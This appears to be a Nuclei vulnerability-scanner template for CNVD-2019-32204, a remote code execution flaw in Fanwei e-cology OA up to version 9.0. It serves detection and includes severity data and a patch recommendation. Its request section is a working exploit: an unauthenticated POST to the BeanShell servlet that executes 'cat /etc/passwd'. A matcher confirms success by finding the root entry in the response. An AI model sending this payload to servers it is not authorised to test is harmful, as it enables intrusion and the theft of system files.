id: CNVD-2019-32204
info:
  name: Fanwei e-cology <=9.0 - Remote Code Execution
  author: daffainfo
  severity: critical
  description: Fanwei e-cology <=9.0 is vulnerable to remote code execution, allowing
    attackers to execute commands on the target server via an unauthorized access
    problem interface in the BeanShell component, but a security patch has been released
    to address this issue.
  reference:
  - https://blog.actorsfit.com/a?ID=01500-11a2f7e6-54b0-4a40-9a79-5c56dc6ebd51
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: fanwei,cnvd,cnvd2019,rce
  metadata:
    impact: The impact of the CNVD-2019-32204 vulnerability in Fanwei e-cology <=9.0
      can result in unauthorized remote code execution, which can compromise the security
      of the target server and lead to significant data loss or theft.
    recommendation: It is highly recommended that users of Fanwei e-cology OA system
      install the security patch immediately to mitigate the risk of remote code execution
      vulnerabilities.
requests:
- raw:
  - 'POST /bsh.servlet.BshServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    bsh.script=exec("cat+/etc/passwd");&bsh.servlet.output=raw

    '
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
